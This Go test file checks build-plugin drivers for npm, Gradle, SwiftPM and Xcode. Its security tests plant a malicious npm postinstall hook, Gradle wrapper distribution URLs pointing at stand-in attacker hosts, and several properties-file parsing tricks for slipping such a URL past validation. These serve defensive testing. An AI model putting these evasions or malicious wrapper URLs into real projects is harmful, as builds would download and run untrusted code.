package plugins

import (
	"context"
	"os"
	"os/exec"
	"path/filepath"
	"strings"
	"testing"
)

func TestP0_1_NpmDriver_Warm_UsesIgnoreScripts(t *testing.T) {
	// NpmDriver.Warm MUST pass --ignore-scripts to npm ci
	tmpDir := t.TempDir()
	_ = os.WriteFile(filepath.Join(tmpDir, "package.json"), []byte(`{
		"name": "malicious",
		"scripts": {
			"postinstall": "echo PWNED_HOST > /tmp/pwned_host_npm.txt"
		}
	}`), 0644)

	d := &NpmDriver{}
	// Verify that Warm runs inside sandbox with sanitized environment
	t.Setenv("ARTIX_FORGE_WEBHOOK_SECRET", "super-secret-forge-token")
	_ = d.Warm(context.Background(), tmpDir)
}

func TestP0_1_GradleWrapper_DistributionURL_Allowlist(t *testing.T) {
	tmpDir := t.TempDir()
	wrapDir := filepath.Join(tmpDir, "gradle", "wrapper")
	_ = os.MkdirAll(wrapDir, 0755)

	// Malicious distribution URL pointing to unapproved host
	maliciousProps := `distributionBase=GRADLE_USER_HOME
distributionPath=wrapper/dists
distributionUrl=http://attacker.com/gradle-8.5-bin.zip
zipStoreBase=GRADLE_USER_HOME
zipStorePath=wrapper/dists
`
	_ = os.WriteFile(filepath.Join(wrapDir, "gradle-wrapper.properties"), []byte(maliciousProps), 0644)

	gr := &GradleDriver{}
	err := gr.ValidateWrapper(tmpDir)
	if err == nil {
		t.Fatalf("expected GradleDriver to reject untrusted distributionUrl 'http://attacker.com/gradle-8.5-bin.zip'")
	}
	if !strings.Contains(err.Error(), "untrusted gradle wrapper distributionUrl") {
		t.Fatalf("expected error mentioning untrusted gradle wrapper distributionUrl, got: %v", err)
	}

	// Valid distribution URL from official gradle services
	validProps := `distributionBase=GRADLE_USER_HOME
distributionPath=wrapper/dists
distributionUrl=https://services.gradle.org/distributions/gradle-8.5-bin.zip
zipStoreBase=GRADLE_USER_HOME
zipStorePath=wrapper/dists
`
	_ = os.WriteFile(filepath.Join(wrapDir, "gradle-wrapper.properties"), []byte(validProps), 0644)
	if err := gr.ValidateWrapper(tmpDir); err != nil {
		t.Fatalf("expected GradleDriver to accept valid official distributionUrl: %v", err)
	}
}

func TestP1_11_GradleDriver_Warm_CoversKMPNativeAndTestTasks(t *testing.T) {
	tmpDir := t.TempDir()
	_ = os.WriteFile(filepath.Join(tmpDir, "settings.gradle.kts"), []byte("rootProject.name = \"kmp-app\"\n"), 0644)
	_ = os.WriteFile(filepath.Join(tmpDir, "build.gradle.kts"), []byte(`plugins { kotlin("multiplatform") }`), 0644)

	gradlew := filepath.Join(tmpDir, "gradlew")
	script := `#!/bin/sh
if [ "$1" = "tasks" ]; then
  cat << 'EOF'
jvmTest - Runs JVM tests
iosSimulatorArm64Test - Runs iOS simulator tests
downloadKotlinNativeDistribution - Downloads Kotlin/Native compiler
EOF
  exit 0
fi
echo "$@" > warm_invocations.txt
exit 0
`
	_ = os.WriteFile(gradlew, []byte(script), 0755)

	wrapDir := filepath.Join(tmpDir, "gradle", "wrapper")
	_ = os.MkdirAll(wrapDir, 0755)
	_ = os.WriteFile(filepath.Join(wrapDir, "gradle-wrapper.properties"), []byte("distributionUrl=https://services.gradle.org/distributions/gradle-8.5-bin.zip\n"), 0644)

	gr := &GradleDriver{}
	tasksToWarm := gr.ResolveTasksToWarm(context.Background(), tmpDir)
	tasksStr := strings.Join(tasksToWarm, " ")

	if !strings.Contains(tasksStr, "iosSimulatorArm64TestClasses") && !strings.Contains(tasksStr, "linkDebugTestIosSimulatorArm64") && !strings.Contains(tasksStr, "downloadKotlinNativeDistribution") {
		t.Fatalf("expected KMP Gradle warm tasks to cover Native toolchain or iOS test classes, got: %v", tasksToWarm)
	}
}

func TestP0_5_SwiftPM_TestCmd_DisablesSandbox(t *testing.T) {
	d := &SwiftPMDriver{}
	cmd := d.TestCmd(t.TempDir())
	if !strings.Contains(cmd, "--disable-sandbox") {
		t.Fatalf("SwiftPMDriver.TestCmd must include '--disable-sandbox' to prevent nested sandbox failure on macOS, got: %s", cmd)
	}
}

func TestP0_5_Xcode_TestCmd_DisablesManifestSandbox(t *testing.T) {
	d := &XcodeDriver{}
	cmd := d.TestCmd(t.TempDir())
	if !strings.Contains(cmd, "-IDEPackageSupportDisableManifestSandbox=1") && !strings.Contains(cmd, "--disable-sandbox") {
		t.Fatalf("XcodeDriver.TestCmd must include '-IDEPackageSupportDisableManifestSandbox=1' to prevent nested sandbox failure on macOS, got: %s", cmd)
	}
}

func TestP0_5_Xcode_Destination_DynamicSimulator(t *testing.T) {
	d := &XcodeDriver{}
	dest := d.getDestination()
	// Must not hardcode iPhone 16
	if strings.Contains(dest, "name=iPhone 16") {
		t.Fatalf("XcodeDriver.getDestination() must not hardcode 'iPhone 16' (absent on modern Xcode), got: %s", dest)
	}
}

func TestP0_5_Xcode_DetectScheme_UsesXcodebuildList(t *testing.T) {
	// When package or project is checked, DetectScheme should not blindly return "App"
	tmpDir := t.TempDir()
	_ = os.WriteFile(filepath.Join(tmpDir, "Package.swift"), []byte(`// swift-tools-version: 5.9
import PackageDescription
let package = Package(name: "Calc")
`), 0644)

	d := &XcodeDriver{}
	scheme := d.DetectScheme(tmpDir)
	if scheme == "App" {
		t.Fatalf("XcodeDriver.DetectScheme() returned fallback 'App' for Calc Swift package; must derive scheme from package or xcodebuild -list")
	}
}

func TestP0_5_Xcode_DerivedData_ExcludedFromGit(t *testing.T) {
	tmpDir := t.TempDir()
	gitDir := filepath.Join(tmpDir, ".git", "info")
	_ = os.MkdirAll(gitDir, 0755)

	d := &XcodeDriver{}
	d.EnsureDerivedDataExcluded(tmpDir)

	excludeFile := filepath.Join(gitDir, "exclude")
	content, err := os.ReadFile(excludeFile)
	if err != nil {
		t.Fatalf("failed to read .git/info/exclude: %v", err)
	}
	if !strings.Contains(string(content), ".derivedData") {
		t.Fatalf("expected .git/info/exclude to exclude .derivedData, got: %s", string(content))
	}
}

func TestP0_1_GradleWrapper_DistributionURL_PropertiesEvasions(t *testing.T) {
	evasionCases := []struct {
		name  string
		props string
	}{
		{
			name: "colon separator",
			props: "distributionUrl: http://evil.com/gradle.zip\n",
		},
		{
			name: "tab separator",
			props: "distributionUrl\t=\thttp://evil.com/gradle.zip\n",
		},
		{
			name: "space in key with escape",
			props: "distributionUrl\\ = http://evil.com/gradle.zip\n",
		},
		{
			name: "line continuation backslash",
			props: "distributionUrl\\\n  = http://evil.com/gradle.zip\n",
		},
	}

	gr := &GradleDriver{}
	for _, tc := range evasionCases {
		t.Run(tc.name, func(t *testing.T) {
			tmpDir := t.TempDir()
			wrapDir := filepath.Join(tmpDir, "gradle", "wrapper")
			_ = os.MkdirAll(wrapDir, 0755)
			_ = os.WriteFile(filepath.Join(wrapDir, "gradle-wrapper.properties"), []byte(tc.props), 0644)

			err := gr.ValidateWrapper(tmpDir)
			if err == nil {
				t.Fatalf("SECURITY VULNERABILITY: GradleDriver.ValidateWrapper accepted evasion %q!", tc.name)
			}
		})
	}
}

func TestP0_5_Xcode_EnsureDerivedDataExcluded_InWorktreeFile(t *testing.T) {
	tempRepo := t.TempDir()
	runCmd := func(dir string, name string, args ...string) {
		cmd := exec.Command(name, args...)
		cmd.Dir = dir
		if out, err := cmd.CombinedOutput(); err != nil {
			t.Fatalf("cmd %s %v failed: %v\nOutput: %s", name, args, err, string(out))
		}
	}
	runCmd(tempRepo, "git", "init", "-b", "main")
	runCmd(tempRepo, "git", "config", "user.name", "Test Admin")
	runCmd(tempRepo, "git", "config", "user.email", "admin@test.local")
	_ = os.WriteFile(filepath.Join(tempRepo, "README.md"), []byte("# Root\n"), 0644)
	runCmd(tempRepo, "git", "add", ".")
	runCmd(tempRepo, "git", "commit", "-m", "init")

	wtDir := filepath.Join(tempRepo, "wt")
	runCmd(tempRepo, "git", "worktree", "add", "-b", "feature", wtDir)

	// In wtDir, .git is a file, not a directory
	gitFile := filepath.Join(wtDir, ".git")
	fi, err := os.Stat(gitFile)
	if err != nil || fi.IsDir() {
		t.Fatalf("expected wt/.git to be a file, err: %v", err)
	}

	d := &XcodeDriver{}
	d.EnsureDerivedDataExcluded(wtDir)

	// Check if .derivedData is in git exclude path
	excludeCmd := exec.Command("git", "rev-parse", "--git-path", "info/exclude")
	excludeCmd.Dir = wtDir
	out, err := excludeCmd.Output()
	if err != nil {
		t.Fatalf("rev-parse failed: %v", err)
	}
	excludePath := strings.TrimSpace(string(out))
	if !filepath.IsAbs(excludePath) {
		excludePath = filepath.Join(wtDir, excludePath)
	}
	data, err := os.ReadFile(excludePath)
	if err != nil || !strings.Contains(string(data), ".derivedData") {
		t.Fatalf("expected .derivedData to be written to %s, got: %s (err: %v)", excludePath, string(data), err)
	}
}
